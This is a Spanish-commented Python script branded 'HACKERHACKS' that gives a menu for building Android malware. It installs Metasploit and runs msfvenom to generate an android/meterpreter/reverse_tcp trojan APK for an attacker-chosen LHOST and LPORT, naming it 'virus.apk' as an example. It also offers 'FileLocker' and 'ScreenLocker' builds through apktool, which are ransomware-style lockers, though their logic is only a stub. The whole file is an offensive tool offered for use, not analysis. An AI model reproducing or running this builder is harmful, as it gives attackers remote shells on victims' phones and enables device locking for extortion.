import os
import time
import subprocess

# Colores
R = '\033[31m'
G = '\033[32m'
Y = '\033[33m'
B = '\033[34m'
W = '\033[0m'

def banner():
    print(f"""{R}
    __  __            _2__               _   _            _        
   |  \/  |          |  | |             | | | |          | |       
   | \  / | __ _  ___|  | | _____ _ __  | |_| | __ _  ___| | _____ 
   | |\/| |/ _` |/ __|  | |/ / _ \ '__| |  _  |/ _` |/ __| |/ / __|
   | |  | | (_| | (__|  |   <  __/ |    | | | | (_| | (__|   <\__ \\
   |_|  |_|\__,_|\___|__|_|\_\___|_|    \_| |_/\__,_|\___|_|\_\___/
    {W}
               {B}--- HACKERHACKS ---{W}
    
             .-'''''---..._
           .'  _     _   _  '.
          /   (o)   (o) (o)   \\     {G} (CALAVERA PULPO SDK){W}
         |                     |
         |   _  _  _  _  _  _  |
          \  (_)(_)(_)(_)(_)(_) /
           '.               .'
             '--...___...--'
    """)

def check_msf():
    # Intento de verificar/instalar msfvenom 3 veces
    for i in range(1, 4):
        print(f"{Y}[*] Verificando msfvenom (Intento {i}/3)...{W}")
        check = subprocess.run(["command -v msfvenom"], shell=True, capture_output=True)
        if check.returncode == 0:
            print(f"{G}[+] msfvenom detectado.{W}")
            return True
        else:
            print(f"{R}[!] No encontrado. Instalando...{W}")
            os.system("pkg install metasploit -y")
    return False

def build_trojan():
    print(f"\n{B}[1] GENERANDO TROYANO CON MSFVENOM{W}")
    ip = input("LHOST: ")
    port = input("LPORT: ")
    name = input("Nombre de salida (ej: virus.apk): ")
    path = input("Ruta de destino (ej: /sdcard/): ")
    
    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {name}"
    os.system(cmd)
    
    if os.path.exists(name):
        os.system(f"cp {name} {path}")
        print(f"{G}[+] Movido a {path}{W}")

def build_apktool_project(mode):
    # Lógica para FileLocker (2) o ScreenLocker (3)
    print(f"\n{B}[*] CONFIGURANDO {mode.upper()} CON APKTOOL{W}")
    name = input("Nombre de la APK: ")
    # Aquí iría la lógica de descompilar/modificar/recompilar
    print(f"{Y}[*] Usando apktool b para compilar...{W}")
    os.system(f"apktool b project_folder -o {name}")
    
    path = input("Ruta para copiar (cp): ")
    os.system(f"cp {name} {path}")
    print(f"{G}[+] {name} enviado a {path}{W}")

def main():
    banner()
    check_msf()
    
    print(f"""
    1. Build Custom Trojan (msfvenom)
    2. Build FileLocker (apktool)
    3. Build ScreenLocker (apktool + SDK Legacy)
    """)
    
    opc = input("Selecciona: ")
    
    if opc == '1':
        build_trojan()
    elif opc == '2':
        build_apktool_project("FileLocker")
    elif opc == '3':
        build_apktool_project("ScreenLocker")
    else:
        print("Opción no válida.")

if __name__ == "__main__":
    main()
